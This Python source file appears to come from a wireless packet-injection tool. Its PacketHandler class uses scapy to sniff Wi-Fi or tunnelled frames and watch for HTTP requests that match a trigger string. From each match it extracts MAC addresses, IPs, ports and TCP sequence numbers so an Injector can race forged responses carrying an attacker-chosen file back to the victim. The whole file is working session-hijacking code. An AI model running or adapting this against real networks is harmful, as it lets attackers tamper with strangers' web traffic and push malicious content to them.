from .injector import Injector
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

class PacketHandler(object):
    """This class does all the heavy-lifting."""

    def __init__(self, *positional_parameters, **keyword_parameters):
        self.handler = keyword_parameters.get('handler')
        self.i = keyword_parameters.get('i')
        self.target_parameters = keyword_parameters.get('target_parameters')

        if self.i is None:
            print ('[ERROR] No injection interface selected')
            exit(1)

        ## Argument handling
        args = keyword_parameters.get('Args')

        ## Trigger setup
        if args.trigger is None:
            self.trigger = 'GET /'
        else:
            self.trigger = args.trigger

        ## Injector creation
        self.injector = Injector(self.i, args)


    def proc_handler(self, packet, args):
        """Process handler responsible for the last mile of packet filtering
        Obtains packet specific information and stores it to memory
        """
        if packet.haslayer(IP) and packet.haslayer(TCP):

            ## Trigger check
            request = self.requestExtractor(packet)
            if self.trigger in request:
                if args.tun is False:
                    rtrmac = packet.getlayer(Dot11).addr1
                    tgtmac = packet.getlayer(Dot11).addr2
                    dstmac = packet.getlayer(Dot11).addr3
                else:
                    rtrmac = packet.getlayer(Ether).dst
                    tgtmac = packet.getlayer(Ether).src
                    dstmac = None
                tgtip = packet.getlayer(IP).src
                svrip = packet.getlayer(IP).dst
                tgtport = packet.getlayer(TCP).sport
                svrport = packet.getlayer(TCP).dport
                size = len(packet.getlayer(TCP).load)
                acknum = str(int(packet.getlayer(TCP).seq) + size)
                seqnum = packet.getlayer(TCP).ack
            else:
                return 0

            try:
                TSVal, TSecr = packet.getlayer(TCP).options[2][1]
            except:
                TSVal = None
                TSecr = None

            # print(tgtmac, rtrmac, tgtip, svrip, tgtport, svrport, acknum, seqnum, request, TSVal, TSecr)
            return (tgtmac,
                    rtrmac,
                    dstmac,
                    tgtip,
                    svrip,
                    tgtport,
                    svrport,
                    acknum,
                    seqnum,
                    request,
                    TSVal,
                    TSecr)
        return None


    def process(self, interface, pkt, args):
        """Process packets coming from the sniffer"""
        try:
            tgtmac,\
            rtrmac,\
            dstmac,\
            tgtip,\
            svrip,\
            tgtport,\
            svrport,\
            acknum,\
            seqnum,\
            request,\
            TSVal,\
            TSecr = self.proc_handler(pkt, args)

            self.injector.inject(tgtmac,
                                 rtrmac,
                                 dstmac,
                                 tgtip,
                                 svrip,
                                 tgtport,
                                 svrport,
                                 acknum,
                                 seqnum,
                                 self.target_parameters.file_inject,
                                 TSVal,
                                 TSecr)
        except:
            return


    def requestExtractor(self, pkt):
        """Extracts the payload for trigger processing"""
        ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
        if len(ret2.strip()) > 0:
            return ret2.replace("'", '').strip()
        else:
            return None
